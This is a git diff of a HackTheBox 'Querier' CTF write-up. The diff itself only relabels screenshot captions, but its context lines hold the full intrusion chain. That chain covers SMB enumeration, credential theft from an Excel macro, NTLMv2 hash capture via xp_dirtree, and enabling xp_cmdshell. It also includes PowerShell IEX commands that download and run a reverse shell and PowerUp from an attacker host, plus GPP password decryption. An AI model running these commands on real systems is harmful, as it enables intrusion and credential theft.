@@ -2,7 +2,7 @@
 title: Querier
 date: 2026-03-05
 categories: [CTFs, HackTheBox]
-tags: [medium, windows, crackmapexec, smbmap, olevba, mssql, xp_dirtree, xp_cmdshell, powerup, gpp-decrypt]
+tags: [windows, crackmapexec, smbmap, olevba, mssql, xp_dirtree, xp_cmdshell, powerup, gpp-decrypt]
 media_subpath: /assets/img/HackTheBox/Querier
 image: 
     path: Querier.webp
@@ -22,7 +22,7 @@ All **TCP** ports scanning with `nmap`
 nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.126.47 -oN allports
 ```
 
-![Description: ](image_1.webp)
+![Nmap: Open Ports](image_1.webp)
 _Open Ports_
 
 >Extract open ports from `nmap` output with the following command:
@@ -38,7 +38,7 @@ Running `nmap`'s default scripts to extract more info and versions.
 nmap -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 -sCV 10.129.126.47 -oN services
 ```
 
-![Description: ](image_2.webp)
+![Nmap: Services](image_2.webp)
 _SMB & MSSQL_
 
 ## Port 445 - SMB Enumeration
@@ -49,14 +49,14 @@ There are a lot of ports open, so let's begin with **SMB**. Using `crackmapexec`
 crackmapexec smb 10.129.126.47
 ```
 
-![Description: ](image_3.webp)
+![Crackmapexec smb](image_3.webp)
 _Initial interaction with SMB_
 
 ```bash
 smbmap -H 10.129.126.47 -u 'null' -p 'null' --no-banner
 ```
 
-![Description: ](image_4.webp)
+![SMB null session](image_4.webp)
 _SMB null session_
 
 `smbmap` has a parameter **-r** to explore the readable shares and there is an **Excel File** with macros.
@@ -65,7 +65,7 @@ _SMB null session_
 smbmap -H 10.129.126.47 -u 'null' -p 'null' -r 'Reports' --no-banner
 ```
 
-![Description: ](image_5.webp)
+![XSLM file](image_5.webp)
 _Finding an Excel file_
 
 We are going to download that **excel** file using `smbmap` as well and we will renamed it as **report.xlsm**.
@@ -74,7 +74,7 @@ We are going to download that **excel** file using `smbmap` as well and we will 
 smbmap -H 10.129.126.47 -u 'null' -p 'null' --download 'Reports/Currency Volume Report.xlsm' --no-banner
 ```
 
-![Description: ](image_6.webp)
+![Transfer file](image_6.webp)
 _Saving Excel file to our box_
 
 >An .xlsm file is an Excel Workbook format that enables the use of embedded macros (VBA).
@@ -88,7 +88,7 @@ You can install [Oletools](https://pypi.org/project/oletools/){: target="_blank"
 olevba report.xlsm
 ```
 
-![Description: ](image_7.webp)
+![Reading macros](image_7.webp)
 _Analyzing Macros with Olevba_
 
 It dumps all the content of the macro from **reporting.xlsm** and there is a credential that we can check if it's valid using `crackmapexec`. Since [Port 1433](https://www.cbtnuggets.com/common-ports/what-is-port-1433){: target="_blank" } is open, we can also check if the credential is valid for [Microsoft SQL Server](https://learn.microsoft.com/en-us/sql/sql-server/what-is-sql-server?view=sql-server-ver16){: target="_blank" } service.
@@ -97,7 +97,7 @@ It dumps all the content of the macro from **reporting.xlsm** and there is a cre
 crackmapexec mssql 10.129.126.47 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
 ```
 
-![Description: ](image_8.webp)
+![Testing Creds on MSSQL](image_8.webp)
 _Testing creds on MSSQL_
 
 >**SQL Credentials**
@@ -116,12 +116,12 @@ Since the credentials have been verified as valid, we can authenticate to the MS
 impacket-mssqlclient WORKGROUP/reporting:'PcwTWTHRwryjc$c6'@10.129.126.47 -windows-auth
 ```
 
-![Description: ](image_9.webp)
-_Access MSSQL as reporting_
+![MSSQL Access](image_9.webp)
+_MSSQL access as reporting_
 
 There is a way to execute commands on SQL Server, however we don't have access to run [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16){: target="_blank" } or to enable it via [sp_configure](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver16){: target="_blank" }.
 
-![Description: ](image_10.webp)
+![Permission denied](image_10.webp)
 _Access denied to xp_cmdshell_
 
 ### NTLMv2 Hash Capture via xp_dirtree
@@ -132,7 +132,7 @@ Since don't have permission to run or enable `xp_cmdshell`, we can attempt to ge
 xp_dirtree
 ```
 
-![Description: ](image_11.webp)
+![xp_dirtree](image_11.webp)
 _Listing directories with xp_dirtree_
 
 Now we can abuse this functionality to list all the files in a **SMB** remote server via a [UNC Path](https://www.minitool.com/lib/unc-path.html){: target="_blank" }, which means we could leverage `xp_dirtree` to collect NTLMv2 hashes.
@@ -149,7 +149,7 @@ Then use `xp_dirtree` to list the content of you shared directory.
 xp_dirtree \\10.10.15.41\share
 ```
 
-![Description: ](image_12.webp)
+![Hash capture](image_12.webp)
 _NTLMv2 hash capture_
 
 As shown above, you managed to get the **NTLMv2** hash for **mssql-svc** user, so now you can crack it using `john`:
@@ -158,7 +158,7 @@ As shown above, you managed to get the **NTLMv2** hash for **mssql-svc** user, s
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![Description: ](image_13.webp)
+![Cracking](image_13.webp)
 _Cracking NTLMv2 Hash_
 
 We found the password for **mssql-svc**, we can check it with `crackmapexec` as well. You can notice the credential is valid but also we have **Pwn3d!** next to it. This means we have more permissions on this service.
@@ -167,7 +167,7 @@ We found the password for **mssql-svc**, we can check it with `crackmapexec` as 
 crackmapexec mssql 10.129.126.47 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
 ```
 
-![Description: ](image_14.webp)
+![Testing creds](image_14.webp)
 _Testing new creds on MSSQL_
 
 >**SQL Credentials**
@@ -183,7 +183,7 @@ After login in as **mssql-svc**, we can try to run `xp_cmdshell` but we got an e
 impacket-mssqlclient WORKGROUP/mssql-svc:'corporate568'@10.129.126.47 -windows-auth
 ```
 
-![Description: ](image_15.webp)
+![MSSQL Access](image_15.webp)
 _Access as mssql-svc_
 
 To enable `xp_cmdshell` you must execute the following commands in that order. After doing that, you will able to run commands via `xp_cmdshell`:
@@ -195,7 +195,7 @@ sp_configure 'xp_cmdshell', 1
 RECONFIGURE
 ```
 
-![Description: ](image_16.webp)
+![Enabling xp_cmdshell](image_16.webp)
 _Enabling xp_cmdshell_
 
 Finally to get a shell on the box we can use [ConPtyShell](https://github.com/antonioCoco/ConPtyShell){: target="_blank" } to get a full interactive `powershell`. To interpret the script we have to run the following command via `xp_cmdshell`.
@@ -207,7 +207,7 @@ Finally to get a shell on the box we can use [ConPtyShell](https://github.com/an
 xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.15.41/revshell.ps1\")"
 ```
 
-![Description: ](image_17.webp)
+![Initial Access](image_17.webp)
 _Powershell access as mssql-svc_
 
 ## Privilege Escalation | GPP Passwords
@@ -218,7 +218,7 @@ We are going to use [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tre
 IEX(New-Object Net.WebClient).downloadString('http://10.10.15.41/PowerUp.ps1')
 ```
 
-![Description: ](image_18.webp)
+![PowerUp](image_18.webp)
 _Running PowerUp_
 
 There is a **Groups.xml** file on the target that has a credential for the admin user. `PowerUp` already gave us the decrypted password but you can also do it with `gpp-decrypt`.
@@ -227,7 +227,7 @@ There is a **Groups.xml** file on the target that has a credential for the admin
 type "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
 ```
 
-![Description: ](image_19.webp)
+![Groups.xml file](image_19.webp)
 _Groups.xml file_
 
 Using `gpp-decrypt` to get the password.
@@ -236,7 +236,7 @@ Using `gpp-decrypt` to get the password.
 gpp-decrypt "CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"
 ```
 
-![Description: ](image_20.webp)
+![gpp-decrypt](image_20.webp)
 _Administrator Password_
 
 Validating the credential with `crackmapexec`:
@@ -245,7 +245,7 @@ Validating the credential with `crackmapexec`:
 crackmapexec smb 10.129.126.47 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
 ```
 
-![Description: ](image_21.webp)
+![Testing Creds](image_21.webp)
 _Testing Admin Creds_
 
 Shell as **NT Authority\\System**
@@ -254,7 +254,7 @@ Shell as **NT Authority\\System**
 impacket-psexec Administrator@10.129.126.47
 ```
 
-![Description: ](image_22.webp)
+![Shell as system](image_22.webp)
 _Shell as system_
 
 ## Flags
